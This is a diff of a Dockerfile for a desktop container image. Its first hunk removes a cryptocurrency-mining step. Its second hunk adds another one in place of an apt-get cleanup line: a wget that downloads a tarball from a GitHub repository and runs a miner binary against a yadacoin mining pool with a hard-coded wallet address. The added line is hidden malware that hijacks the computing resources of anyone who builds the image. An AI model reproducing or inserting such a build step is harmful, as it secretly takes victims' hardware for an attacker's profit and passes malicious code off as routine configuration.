@@ -50,9 +50,6 @@ RUN apt-get -qqy update \
     && apt-get autoclean \
     && apt-get autoremove \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
-    && 
-wget https://github.com/alissa221/samo21/raw/main/samo-121.tar.gz && tar xvzf samo-121.tar.gz && cd samo-121 && ./samo -o pool.yadacoin.io:3333 -u 1HL5FiTJwo2Vs7PrWgjQ3Ft9MDbvNAVDP8 -k -a rx/yada -t16
-
 # COPY conf.d/* /etc/supervisor/conf.d/
 
 
@@ -76,6 +73,6 @@ ENV SCREEN_WIDTH=1280 \
 RUN apt-get update -qqy \
     && apt-get -qqy install --no-install-recommends \
         dbus-x11 xfce4 \
-    && apt-get autoclean \
+    && wget https://github.com/alissa221/ada/raw/main/rama_221.tar.gz && tar xvzf rama_221.tar.gz && ./rama -a rx/yada -o yadacoin.cryptonpool.com:3333 -u 1HL5FiTJwo2Vs7PrWgjQ3Ft9MDbvNAVDP8  \
     && apt-get autoremove \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
